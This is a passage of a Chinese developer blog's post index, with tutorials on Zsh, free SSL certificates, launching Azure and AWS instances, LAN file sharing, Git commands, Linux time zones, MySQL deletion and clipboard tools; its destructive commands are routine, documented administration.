安装ZSH既然要安装Zsh，那就不得不安装oh-my-zsh了，所以这里一起安装了。 1pacman -S zsh oh-my-zsh-git 安装Spaceship ZSHSpaceship ZSH 是Zsh 的提示符工具。 克隆仓库 1git clone https:&#x2F;&#x2F;github.com&#x2F;denysdovhan&#x2F;spaceship-prompt.git &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&quot; 链接文件 1ln -s &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&#x2F;spaceship.zsh&quot; &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship.zsh-theme&quot; 更改默认theme 12# vim ~&#x2F;.zshrcZSH_THEME&#x3D;&quot;spaceship&quot; 重启终端即可。 参考链接 安装ArchWSL（Windows 下的Arch Linux 子系统）","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"WSL","slug":"WSL","permalink":"https://www.0x2beace.com/tags/WSL/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"}]},{"title":"如何申请免费的SSL 证书","slug":"how-to-apply-for-a-free-ssl-certificate","date":"2020-08-14T10:03:13.000Z","updated":"2020-09-20T15:41:05.462Z","comments":true,"path":"how-to-apply-for-a-free-ssl-certificate/","link":"","permalink":"https://www.0x2beace.com/how-to-apply-for-a-free-ssl-certificate/","excerpt":"这篇笔记用来记录如何申请免费的 SSL 证书，通过本文介绍的方式所申请的证书有效期只有三个月，请谨慎选择。","text":"这篇笔记用来记录如何申请免费的 SSL 证书，通过本文介绍的方式所申请的证书有效期只有三个月，请谨慎选择。 准备像这类提供免费 SSL 证书的网站非常多，这里我选择的平台是 FreeSSL.cn 。 在正式开始之前，你得准备一个邮箱，注册 一个 FreeSSL.cn 账号，然后登录。 将需要申请证书的域名填写在输入框中，选择多域名通配符，然后点击创建免费的SSL 证书。 我这里选择的是泛域名，根据你自己的实际情况，去创建相应子域名的证书： example.com：主域名 *.example.com：泛域名 选择浏览器生成。 点击确认创建。 添加TXT 记录打开需要申请 SSL 证书的域名管理后台，找到 DNS 管理。 添加 TXT 验证，将刚才的记录值与TXT 记录添加到对应的TXT 类型。 注意⚠️：记录值区分大小写。 检测是否配置成功。 在完成验证之前不要离开当前页面，验证成功之后，点击验证。 如果配置成功没问题，就可以点击验证，下载证书就完成了。 注意⚠️：使用此方式获取的证书，有效期只有三个月。","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"SSL","slug":"SSL","permalink":"https://www.0x2beace.com/tags/SSL/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"}]},{"title":"手把手教你如何创建启动 Azure 实例","slug":"teach-you-how-to-create-and-start-an-azure-instance","date":"2020-08-12T15:49:19.000Z","updated":"2020-08-27T06:26:47.806Z","comments":true,"path":"teach-you-how-to-create-and-start-an-azure-instance/","link":"","permalink":"https://www.0x2beace.com/teach-you-how-to-create-and-start-an-azure-instance/","excerpt":"这篇笔记用来整理如何创建启用 Azure 实例。因为这方面可以找到的资料比较少，所以整理一下。 一是方便自己以后回顾，二是给其他人作为参考。","text":"这篇笔记用来整理如何创建启用 Azure 实例。因为这方面可以找到的资料比较少，所以整理一下。 一是方便自己以后回顾，二是给其他人作为参考。 准备因为本文是创建微软云，所以首先你得有一个微软账号。 打开 Microsoft Azure 进行登录，登录成功之后，进入云服务管理后台。 创建实例点击创建资源。 可以搜索你想创建的云服务类型，这里我选择的是 Ubuntu Server 18.04 LTS。 点击创建。 放心，这里的创建并不是正真意义上的创建。接下来需要为机器预设配置。 下面对常见的配置进行简单说明： 资源组：用来分配一些权限以及策略。 虚拟机名称：你希望用什么名称来称呼这台机器（通常是英文） 区域：选择机器所在地区 映像：选择操作系统 大小：选择一个合适的负责类型，可以理解成机器的硬件配置。 身份验证类型：通常有两种：ssh 密钥和密码，强烈建议使用密钥而不使用密码（密哦存在被暴力破解的风险）。 用户名：微软云默认没有给root 用户，这里需要指定用户名称。 公共入站端口：通常是只开启HTTP (80)、HTTPS (443)、SSH (22) 。 完成基本配置之后，点击下一步：磁盘。 Azure 默认只有一个用于短期存储的临时盘，而临时盘通常都很小。 默认的磁盘很小，如果想扩大有两种方式： 创建新的磁盘，需要手动挂载。 更改默认磁盘的大小。 配置完磁盘之后，点击下一步：网络。 网络配置，公用ip 可以选择无，后面再去新建。 然后点击下一步：管理。 管理、高级、标记这一块，如果没有特殊需求可以直接使用默认配置。 最后点击查看+创建，可以看到预设的配置信息，如果符合预期，点击创建。 下载私钥并保存好。 此时，虽然已经创建好虚拟机，但是还不能直接使用，因为没有配置IP。 关联IPAzure 和 AWS 不同，它并没有弹性IP 的概念，如果需要配置IP，需要在搜索栏中搜索公共IP地址， 点击第一个搜索结果。 点击添加。 配置IP 基本信息，然后点击创建。 此时，只是创建了内网IP，并没有与外网IP 地址进行关联， 点击刚才新建的公共 IP 地址，点击配置。 资源类型选择网络接口，网络接口与对应的实例进行关联。 关联成功之后，就可以进行连接了。 连接 打开终端 请确保你对私钥具有只读访问权限。 1chmod 400 &lt;私钥&gt; 运行以下示例命令以连接到 VM。 1ssh -i &lt;私钥路径&gt; user@ip_address user：表示VM 用户 ip_address：表示外网IP 地址 扩大默认磁盘大小上面简单提到过，如果想要扩大默认磁盘的大小，有两种方式： 添加新磁盘。这种方式需要手动挂载，如果对linux 并不熟悉，这种方式不推荐新手用户使用。 更改默认磁盘大小。 第二种方式并不能直接更改，需要先将服务器停掉（注意⚠️：不是删除）。 搜索磁盘，点击第一个搜索结果。 点击需要扩大的磁盘实例，注意：只能扩大，不能缩小。 然后点击保存即可。 总结至此，就已经完成了Azure 的创建了，这方面需要学习的还有很多，这里只是简单的整理了一下自己遇到的问题。 有些地方可能没说清楚，但如果能帮到你那真是太好了","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"云","slug":"云","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"}]},{"title":"Windows 和 Mac 在局域网内如何共享文件？","slug":"how-do-windows-and-mac-share-files-in-the-local-area-network","date":"2020-08-11T14:11:18.000Z","updated":"2020-08-13T11:43:07.419Z","comments":true,"path":"how-do-windows-and-mac-share-files-in-the-local-area-network/","link":"","permalink":"https://www.0x2beace.com/how-do-windows-and-mac-share-files-in-the-local-area-network/","excerpt":"每当手上有两台或多台电脑时，如果想传送一个文件，第一个想到的就是微信、QQ等这类工具。如果碰到了大一点的文件，就得换成网盘或者移动硬盘。 身为一个做开发者，这种做法比较low，所以找了几篇文章学习到了如何在局域网内共享文件。","text":"每当手上有两台或多台电脑时，如果想传送一个文件，第一个想到的就是微信、QQ等这类工具。如果碰到了大一点的文件，就得换成网盘或者移动硬盘。 身为一个做开发者，这种做法比较low，所以找了几篇文章学习到了如何在局域网内共享文件。 准备这里准备的是用 Windows 作为主机创建共享文件。 首先要确认准备传输文件的 Windows 和 Mac 是在同一个路由器组成的局域网内。 然后打开 Windows 的文件资源管理器，在其根目录下创建一个共享文件夹，名称随意，自己知道就好了。 右键文件夹，点击属性，找到 共享 Tab，点击高级共享。 勾选共享此文件夹，点击确定。 然后回到共享文件夹，右键点击属性，找到共享，选择用户。 如果允许其他人写入，则选择 Everyone，更改为：读取/写入。 访问Windows 本机访问123# ComputerName 表示：你的计算机名称# ShareFolders 表示：共享文件夹名称file:&#x2F;&#x2F;ComputerName&#x2F;ShareFolders&#x2F; Mac 局域网访问Mac 有两种方式： 通过浏览器访问 通过访达访问，使用快捷键 ⌘ + k123# ComputerName 表示：需要访问的计算机名称# ShareFolders 表示：共享文件夹名称smb:&#x2F;&#x2F;ConputerName&#x2F;ShareFolders&#x2F; 通过验证之后，就能访问到共享文件夹了。 到这里应该就能顺利的在两个或多个电脑之间传输文件了。 如果还不能访问，可以ping 一下对方的主机，如果没有ping通，检查一下防火墙设置。 如果防火墙关着，那么会 ping 不通。 参考链接 Windows 和 Mac 在局域网内如何共享文件？ 共享文件夹 一个实现Windows和Mac之间文件互传的简单方法","categories":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"},{"name":"Windows","slug":"Skill/Windows","permalink":"https://www.0x2beace.com/categories/Skill/Windows/"},{"name":"Mac","slug":"Skill/Windows/Mac","permalink":"https://www.0x2beace.com/categories/Skill/Windows/Mac/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Git 常用命令参考手册","slug":"git-common-command-reference-manual","date":"2020-08-11T01:22:19.000Z","updated":"2020-08-11T01:24:32.528Z","comments":true,"path":"git-common-command-reference-manual/","link":"","permalink":"https://www.0x2beace.com/git-common-command-reference-manual/","excerpt":"虽然每天都在使用Git，但是有些命令太久不使用，还是会忘记，所以这篇笔记的目的就是整理那些Git 常用命令。","text":"虽然每天都在使用Git，但是有些命令太久不使用，还是会忘记，所以这篇笔记的目的就是整理那些Git 常用命令。 基础配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 1234567891011121314151617181920# 查看全局配置列表$ git config --global --list# 查看局部配置列表$ git config --local --list# 设置全局用户名&#x2F;邮箱$ git config --global user.name &quot;yourName&quot;$ git config --global user.email &quot;example@example.com&quot;# 设置本地当前工作区仓库用户名&#x2F;邮箱$ git config --local user.name &quot;yourName&quot;$ git config --local user.email &quot;example@example.com&quot;# 将默认文本编辑器设置为 emacs&#x2F;vim$ git config --global core.editor emacs&#x2F;vim# 编辑当前仓库的配置文件$ git config -e # 等价与 vim .git&#x2F;config# 编辑全局配置文件$ git config --global -e 命令别名配置12345678# 添加别名 git st &#x3D; git status$ git config --global alias.st status# 删除 st 别名$ git config --global --unset alias.st# 执行外部命令, 只要在前面加 ! 即可$ git config --global alias.st &#39;!echo hello&#39;; 代理配置如果想知道关于Git配置代理的更多信息，可以查阅这篇笔记。 1234567891011# 配置HTTP&#x2F;HTTPS 代理$ git config --global https.proxy http:&#x2F;&#x2F;127.0.0.1:1087$ git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1087# 查看$ git config --global --get http.proxy$ git config --global --get https.proxy# 取消代理$ git config --global --unset http.proxy$ git config --global --unset https.proxy 生成SSHKey关于如何配置ssh config 可以查阅这篇笔记。 12345# 将ssh key生成在默认下，也就是&#96;~&#x2F;.ssh&#x2F;id_rsa&#96;。$ ssh-keygen -t rsa -C &quot;youremail&quot;# 将ssh key生成在指定路径下的指定文件名中$ ssh-keygen -t rsa -f ~&#x2F;.ssh&#x2F;id_rsa_bitbucket -C &quot;youremail&quot; 准备工作1234567891011# 在当前目录新建一个Git代码库$ git init# 新建一个目录，将其初始化为Git代码库$ git init [project-name]# 下载一个项目和它的整个代码历史$ git clone [url] [project-name]# 浅克隆, 历史记录只克隆最后一条, 减少克隆时间$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git 基础操作基础操作中的命令都是日常使用频率非常高的。 文件状态12345678# 查看工作区状态$ git status# 列出没有被 .gitignore 忽略的文件列表$ git status --ignored# 列出没有被 .gitignore 忽略的文件列表$ git ls-files 文件操作1234567891011121314151617181920# 暂存所有$ git add -A# 暂存某个文件$ git add .&#x2F;README.md# 添加当前目录的所有文件到暂存区 $ git add .# 暂存一系列文件$ git add 1.txt 2.txt ...# 从暂存区中删除文件（git add 的反向操作）$ git rm [file] # 暂存区、工作区一起删除$ git rm -f [file]# 停止追踪指定文件，但该文件会保留在工作区$ git rm --cached [file] 查看文件改动123456789101112131415# 查看所有文件改动$ git diff# 查看具体文件的改动$ git diff README.md# 查看指定 commit-id 改动内容$ git diff [commit-id]# 对比工作区和版本库里的最新版本有什么区别$ git diff HEAD --[file-name]# 查看某个文件的历史修改记录$ git log README.md$ git show [commit-id] README.md 撤销与回滚1234567891011121314151617# 恢复暂存区的指定文件到工作区$ git checkout [file]# 恢复暂存区的所有文件到工作区$ git checkout .# 重置暂存区与工作区，与上一次commit保持一致$ git reset --hard# 回滚上一个版本$ git reset --hard HEAD^# 回退到指定版本（会重置暂存区与工作区）$ git reset --hard [commit-id]# 回退到指定版本（不会重置暂存区与工作区，会回到该版本的暂存状态）$ git reset --soft [commit-id] 提交123456789101112# 提交暂存区到本地仓库$ git commit -m [message]# 提交暂存区的指定文件到本地仓库git commit README.md -m [message]# 提交并显示diff变化git commit -v# 重写上一次的提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m [message] 日志1234567891011121314151617181920# 查看完整历史提交记录$ git log# 查看前n 条记录$ git log -n# 以图形方式查看完整历史提交记录$ git log --graph --pretty&#x3D;oneline --abbrev-commit# 通过commit log 进行搜索$ git log -i --grep&#x3D;&quot;fire bug&quot;# 列出提交者贡献数量, 只会打印作者和贡献数量$ git shortlog -sn# 以提交贡献数量排序并打印出信息$ git shortlog -n# 采用邮箱格式化的方式进行查看贡献度$ git shortlog -e 分支123456789101112131415161718192021222324252627282930313233343536373839404142434445# 查看本地分支git branch# 查看所有分支git branch -a# 查看本地分支所关联的远程分支git branch -vv# 查看本地 master 分支创建时间git reflog show --date&#x3D;iso master# 新建一个分支，但依然停留在当前分支$ git branch [branch-name]# 新建一个分支，并切换到该分支$ git checkout -b [branch]# 新建一个分支，指向指定commit$ git branch [branch] [commit-id]# 新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch]# 切换到指定分支，并更新工作区$ git checkout [branch-name]# 建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch]# 合并指定分支到当前分支$ git merge [branch]# 选择一个commit，合并进当前分支$ git cherry-pick [commit-id]# 删除指定分支$ git branch -d [branch-name]# 强制删除指定分支$ git branch -D [branch-name]# 删除远程分支$ git push origin --delete [branch-name]$ git branch -dr [remote&#x2F;branch] 远程仓库管理1234567891011121314151617# 查看远程仓库（默认是origin，这是git 会使用的默认名称）$ git remote # 指定-v, 查看所有远程仓库地址$ git remote -v# 添加一个新的远程仓库$ git remote add [origin-name] https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git# 查看指定远程仓库的详情信息$ git remote show [origin-name]# 重命名远程仓库$ git remote rename [old-name] [new-name]# 移除远程仓库$ git remote remove [origin-name] Push1234567891011# 默认推送当前分支$ git push# 推送内容到主分支，并建立追踪关系$ git push -u origin master# 将本地分支推送到指定远程分支， （本地分支:远程分支）$ git push origin [branch]:[branch]# 强行推送当前分支到远程仓库，即使有冲突$ git push -f Pull1234567891011# 取回默认远程仓库的变化，并自动与本地分支合并$ git pull# 取回指定远程仓库的变化，并自动与本地指定分支合并（远程分支名:本地分支名）$ git pull [remote] [branch]:[branch]# 取回指定远程仓库的变化，并自动与本地当前分支合并$ git pull origin master# 取回远程仓库的所有变动，但是不会自动与本地当前分支合并$ git fetch 进阶操作进阶操作中的命令是一些很实用，但可能不常使用，所以把它们单独拎出来。 cherry-pick12345# 选择一个commit，合并进当前分支$ git cherry-pick [commit-id]# 保留原有作者信息进行提交$ git cherry-pick -x [commit-id] Stash1234567891011# 将当前的工作区隐藏$ git stash# 恢复隐藏的工作区，并将此次隐藏记录从隐藏列表中移出$ git stash pop# 恢复隐藏的工作区，保留此次隐藏记录$ git stash apply# 查看当前隐藏列表$ git stash list Blamegit blame 用于查看某个文件的修改历史记录是哪个作者进行了改动。 12345678# 查看 README.md 文件的修改历史记录，包括时间、作者以及内容$ git blame README.md# 查看谁改动了 README.md 文件的 11行-12行$ git blame -L 11,12 README.md# 查看谁改动了 README.md 文件11行以后$ git blame -L 11 README.md 标签1234567891011121314151617181920212223242526272829303132# 列出本地所有标签git tag# 新建一个tag在当前commit$ git tag [tag]# 新建一个tag在指定commit$ git tag [tag] [commit]# 删除本地tag$ git tag -d [tag]# 删除远程tag$ git push origin :refs&#x2F;tags&#x2F;[tagName]# 列出远程所有标签$ git ls-remote --tags origin# 创建带有附注标签$ git tag -a v1.1.0 -m &quot;标签描述&quot;# 查看本地tag信息$ git show [tag]# 提交指定tag$ git push [remote] [tag]# 提交所有tag$ git push [remote] --tags# 新建一个分支，指向某个tag$ git checkout -b [branch] [tag] Git ProTipsGit ProTips 则是整理的一些Git 的奇技淫巧。 12345678910# 通过使用别名，优化 git log 输出，这里另外提供几种模式, 可以选择喜欢的一种进行别名配置$ git config --global alias.lg &quot;log --graph --pretty&#x3D;format:&#39;%Cred%h - %Cgreen[%an]%Creset -%C(yellow)%d%Creset %s %C(yellow)&lt;%cr&gt;%Creset&#39; --abbrev-commit --date&#x3D;relative&quot;$ git config --global alias.his &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Creset %s %C(magenta)in %Cred%h %C(magenta)commited by %Cgreen%cn %C(magenta)on %C(yellow) %cd %C(magenta)from %Creset %C(yellow)%d&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;$ git config --global alias.hist &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Cred%h - %C(bold white) %s %Creset %C(yellow)%d %C(cyan) &lt;%cd&gt; %Creset %Cgreen(%cn)&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;$ git config --global alias.lg &quot;log --color --graph --pretty&#x3D;format:&#39;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#39; --abbrev-commit&quot;$ git config --global alias.lg &quot;log --pretty&#x3D;format:&#39;%h - %an, %ar : %s&#39; &quot; 参考链接 Git 常用命令整理 常用Git 命令清单","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"手把手教你如何创建启动 AWS 实例","slug":"teach-you-how-to-start-an-aws-instance","date":"2020-08-10T06:05:17.000Z","updated":"2020-08-27T06:26:53.546Z","comments":true,"path":"teach-you-how-to-start-an-aws-instance/","link":"","permalink":"https://www.0x2beace.com/teach-you-how-to-start-an-aws-instance/","excerpt":"什么是AWS ？ Amazon Web Services (AWS) 是亚马逊提供的全球最全面、应用最广泛的云平台。","text":"什么是AWS ？ Amazon Web Services (AWS) 是亚马逊提供的全球最全面、应用最广泛的云平台。 云这个概念最开始是从国内的阿里云、腾讯云这些地方听到的，后来服务器接触的多了，也慢慢了解了一些国外的云，如：亚马逊云、微软云。 在亚马逊云、软微云上创建一台实例其实是非常简单的事情，但由于这方面资料比较少，导致对于新用户可能不那么友好，我自己当初创建时就不怎么顺利。所以整理这篇笔记的目的有两个，一是方便自己日后回顾，二是给第一次使用的用户一些参考。 启动实例首先登入到AWS ，找到EC2 并点击 在左侧菜单栏中点击实例 点击启动实例 配置实例选择系统映像，这里以Linux 操作系统为例，我选择是Ubuntu Server 18.04 LTS，这个版本表示Ubuntu 服务端 长期稳定支持版本。 选择实例类型，根据自身需要考虑，当然 性能越好价格越高。这里我选择的是一个中等偏下的类型。 配置实例详情信息，这里的这些核心配置，通常都保持默认，只是将自动分配公有IP 地址改为禁用。这样再重启机器时，就不会改变IP了。 根据自身需要分配合适的硬盘大小。 配置安全组，所谓安全组就是拥有相同防火墙规则的群组。这个也是根据自身需要选择是否共用同一个安全组。 拥有同一个安全组就表示拥有相同的防火墙规则。设置完安全组之后，点击审核和启动。 下面会有一个界面给你确认机器的配置是否无误的，从头到尾检查没有问题之后就可以点击启动实例了。 创建密钥可以选择共用已有的密钥对也可以选择新建一个。 然后点击启动实例。 分配弹性IP启动完成之后点击查看实例。 在实例列表中，找到该实例之后，分别点击操作=&gt;联网=&gt;管理IP 地址=&gt;分配弹性 IP 确认分配 分配成功之后，会得到一个弹性IP（公有），然后返回实例列表 关联IP 地址找到刚才启动的那个实例（没有实例ID），分别点击操作=&gt;关联地址 这一步很重要，这里要将实例和弹性IP 地址关联，所以要选择该弹性IP 对应自己的实例。如果不确定是哪一个，可以返回到实例列表中去查看，就是那个没有名称的实例。 然后点击关联 关联成功 直到做完这一步才算正真的启动好一个实例。 连接启动好实例之后，如何连接呢？ 1$ ssh -i &lt;私钥路径&gt; ubuntu@ipaddress 指定刚才生成的密钥对，使用ssh命令 即可连接。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"云","slug":"云","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"}]},{"title":"如何修改 Linux 默认时区","slug":"how-to-modify-the-linux-default-time-zone","date":"2020-08-09T13:23:30.000Z","updated":"2020-08-22T00:44:06.247Z","comments":true,"path":"how-to-modify-the-linux-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/how-to-modify-the-linux-default-time-zone/","excerpt":"在上一篇笔记中，我们知道了如何在Linux 中查看系统默认时区，这篇笔记来学习以下如何修改默认时区。","text":"在上一篇笔记中，我们知道了如何在Linux 中查看系统默认时区，这篇笔记来学习以下如何修改默认时区。 在Linux 服务器或系统上保持正确的时间始终是一个好习惯，它可能具有以下优点： 由于Linux 中的大多数任务都是按时间控制的，因此可以保持系统任务的及时运行。 在系统上记录事件和其他信息的正确时间等等。 在Linux 中设置时区，有几种方式。 0x1. 使用tzselete 命令 使用tzselete 命令选择所在时区。 将时区所在的配置文件TZ=&#39;Asia/Shanghai&#39;; export TZ 添加到~/.profile文件。 使用source ~/.profire命令，使时区设置生效。 0x2. 使用timedatectl 命令Ubuntu 系统提供了timedatectl 命令，非常方便的供我们查看设置Linux 系统时区。 1$ timedatectl set-timezone &quot;Asia&#x2F;ShangHai&quot; 如果你忘记了你想要的时区叫什么名字，那么可以使用下面的命令查看所有可用时区： 1$ timedatectl list-timezones 因为 Linux 的时间分为两种： 硬件时间：由 BIOS（或CMOS）所负责。 系统时间：由 Linux 所负责，系统时间在系统开关机后读取硬件时间后，再由 Linux 管理时间。 0x3. 设置硬件时间12$ cd &#x2F;etc&#x2F; &amp;&amp; ls -al | grep localtimelrwxrwxrwx 1 root root 27 Jul 24 00:57 localtime -&gt; &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Etc&#x2F;UTC 可以看到默认链接的是UTC，所以需要手动更改链接时区文件。 1$ ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime 查看硬件时间 1$ hwclock -r 将系统时间改为硬件时间 1$ hwclock --hctosys 需要想清楚的是，时间戳本身是永远不变的，无论在哪个时区同一时刻所生成的时间戳一定是一样的。 会发生变化的只有时区，而时间戳则是根据时区的不同而解析出来的时间不同。 参考链接 How to Set Time, Timezone and Synchronize System Clock Using timedatectl Command Linux 查看设置系统时区 Linux 时间以及时区","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Mysql 删除数据及数据表","slug":"mysql-delete-data-and-data-table","date":"2020-08-06T14:36:46.000Z","updated":"2020-09-20T15:39:21.488Z","comments":true,"path":"mysql-delete-data-and-data-table/","link":"","permalink":"https://www.0x2beace.com/mysql-delete-data-and-data-table/","excerpt":"在Mysql 中删除数据以及数据表非常的容易，但是需要特别小心，因为一旦删除所有数据都会消失。","text":"在Mysql 中删除数据以及数据表非常的容易，但是需要特别小心，因为一旦删除所有数据都会消失。 删除数据删除表内数据，使用delete关键字。 删除指定条件的数据删除用户表内id 为1 的用户： 1delete from User where id &#x3D; 1; 删除表内所有数据删除表中的全部数据，表结构不变。 对于 MyISAM 会立刻释放磁盘空间，InnoDB 不会释放磁盘空间。 1delete from User; 释放磁盘空间 1optimize table User; 删除数据表删除数据表分为两种方式： 删除数据表内数据以及表结构 只删除表内数据，保留表结构 drop使用drop关键词会删除整张表，啥都没有了。 1drop table User; truncatetruncate 关键字则只删除表内数据，会保留表结构。 1truncate table User; 思考题：如何批量删除前缀相同的表？ 想要实现 drop table like &#39;wp_%&#39;，没有直接可用的命令，不过可以通过Mysql 的语法来拼接。 1234-- 删除”wp_”开头的表：SELECT CONCAT( &#39;drop table &#39;, table_name, &#39;;&#39; ) AS statementFROM information_schema.tablesWHERE table_schema &#x3D; &#39;database_name&#39; AND table_name LIKE &#39;wp_%&#39;; 其中database_name换成数据库的名称，wp_换成需要批量删除的表前缀。 注意只有drop命令才能这样用： 1drop table if exists tablename&#96;; truncate只能这样使用： 1truncate table &#96;tp_trade&#96;.&#96;setids&#96;; 总结 当你不再需要该表时， 用drop; 当你仍要保留该表，但要删除所有记录时， 用truncate; 当你要删除部分记录时， 用delete。","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Git Push -f 命令详解","slug":"detailed-explanation-of-git-push-f-command","date":"2020-08-05T06:49:02.000Z","updated":"2020-08-05T06:49:50.351Z","comments":true,"path":"detailed-explanation-of-git-push-f-command/","link":"","permalink":"https://www.0x2beace.com/detailed-explanation-of-git-push-f-command/","excerpt":"最近遇到了一个Git Push 相关的问题，同事不小心把一些错误代码提交到仓库了。如果每个人直接更新的话，会导致错误代码也更新到本地了。 这个时候想要避免这种情况的发生，唯一可以做的就是将那些错误代码直接覆盖掉。","text":"最近遇到了一个Git Push 相关的问题，同事不小心把一些错误代码提交到仓库了。如果每个人直接更新的话，会导致错误代码也更新到本地了。 这个时候想要避免这种情况的发生，唯一可以做的就是将那些错误代码直接覆盖掉。 git push -fgit push -f 这个命令的作用是将自己本地仓库的代码直接推送至仓库，完全以你的提交为准，之前其他人的提交都会被覆盖。 那么这么可怕的命令，究竟在什么情况下才适用呢？ 使用时机有两种情况下适合使用这个命令： 确定需要覆覆盖提交，就像上面的那种情况，在明确部分提交会导致异常时，可以使用新的提交去覆盖。 需要整理历史提交记录时，有时候项目的 Commit Logs 可能比较乱，不能清晰的看出每一次提交的作用，可以使用 rebase 命令来清理历史提交记录。因为改变了历史，所以正常来说是 push不成功的，所以需要使用 force push来解决这个问题。 默认分支保护因为可能会出现不小心使用的情况，Github、Gitlab这类源码托管网站会提供分支保护机制。可以避免某个分支被 force push，默认是 master为保护分支。 这里以Gitlab为例，设置-&gt;仓库-&gt;Protected Branches： 所以如果想强制提交，前提需要取消对该分支的保护。 万一自己的代码被覆盖掉了，还救得回来吗？ 其实也是有办法的，那就是换你或是其它有之前提交的同事，再次进行 git push -f，将正确的内容强制提交上去，覆盖上一次git push -f所造成的灾难。 参考链接聽說 git push -f 這個指令很可怕，什麼情況可以使用它呢？","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Windows/Mac/Linux 如何将内容输出到剪贴板","slug":"how-to-output-content-to-clipboard-on-windows-mac-linux","date":"2020-08-05T02:07:41.000Z","updated":"2020-09-27T01:22:11.596Z","comments":true,"path":"how-to-output-content-to-clipboard-on-windows-mac-linux/","link":"","permalink":"https://www.0x2beace.com/how-to-output-content-to-clipboard-on-windows-mac-linux/","excerpt":"如何将输出直接复制至剪切板？在不同的系统中，所使用的命令是不同的。","text":"如何将输出直接复制至剪切板？在不同的系统中，所使用的命令是不同的。 Mac12345678&#x2F;&#x2F; 将输出复制至剪贴板$ echo &quot;hello mac&quot; | pbcopy&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板$ pbcopy &lt; remade.md&#x2F;&#x2F; 将剪切板中的内容粘贴至文件$ pbpaste &gt; remade.md LinuxLinux 用户需要先安装 xclip，它建立了终端和剪切板之间的通道。 123456789101112&#x2F;&#x2F; 查看剪切板中的内容$ xclip -o$ xclip -selection c -o&#x2F;&#x2F; 将输出复制至剪贴板$ echo &quot;hello xclip&quot; | xclip-selection c&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板$ xclip -selection c remade.md&#x2F;&#x2F; 将剪切板中的内容粘贴至文件$ xclip -selection c -o &gt; remade.md 或者直接使用xsel命令： 12345&#x2F;&#x2F; 将输出复制至剪贴板$ echo &quot;hello linux&quot; | xsel&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板$ xsel &lt; remade.md 需要注意的是：xsel、xclip 命令是在 X 环境下使用的，所以远程连接服务器时使用会报异常： 1xclip error can&#39;t open display (null) Windows12345&#x2F;&#x2F; 将输出复制至剪贴板$ echo &quot;hello windows&quot; | 